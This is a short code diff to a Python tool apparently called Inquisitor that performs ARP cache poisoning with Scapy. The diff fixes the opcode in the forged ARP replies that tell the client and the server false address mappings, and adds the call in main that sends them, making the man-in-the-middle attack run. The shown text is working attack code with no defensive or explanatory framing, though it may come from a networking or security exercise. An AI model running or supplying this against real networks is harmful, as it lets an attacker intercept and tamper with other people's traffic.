@@ -15,9 +15,9 @@ class Inquisitor():
 
     def send_poison(self):
         # Lying to the client #
-        poison_client = ARP(op="2", pdst=self.ip_addr_host, hwdst=self.mac_addr_host, psrc=self.ip_addr_serv)
+        poison_client = ARP(op=2, pdst=self.ip_addr_host, hwdst=self.mac_addr_host, psrc=self.ip_addr_serv)
         # Lying to the server #
-        poison_serv = ARP(op="2", pdst=self.ip_addr_serv, hwdst=self.mac_addr_serv, psrc=self.ip_addr_host)
+        poison_serv = ARP(op=2, pdst=self.ip_addr_serv, hwdst=self.mac_addr_serv, psrc=self.ip_addr_host)
         # Sending through the Network #
         send(poison_client, verbose=False)
         send(poison_serv, verbose=False)
@@ -47,6 +47,7 @@ def main():
         return
     inquisition = Inquisitor(sys.argv)
     inquisition.verify_addr()
+    inquisition.send_poison()
     
 
 if (__name__ == "__main__"):
